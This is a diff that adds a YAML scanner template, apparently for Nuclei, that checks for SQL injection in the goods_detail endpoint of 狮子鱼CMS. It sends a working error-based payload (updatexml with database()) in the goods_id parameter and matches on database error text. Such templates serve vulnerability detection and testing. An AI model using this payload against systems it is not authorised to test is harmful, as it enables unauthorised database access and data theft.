@@ -1,0 +1,20 @@
+id: shiziyuCMS-goods_detail-sql
+
+info:
+  name: 狮子鱼CMS goods_detail SQL注入漏洞
+  author: shiziyuCMS
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1) HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'XPATH syntax error:'
+          - 'SQLSTATE[HY000]:'
+        condition: and
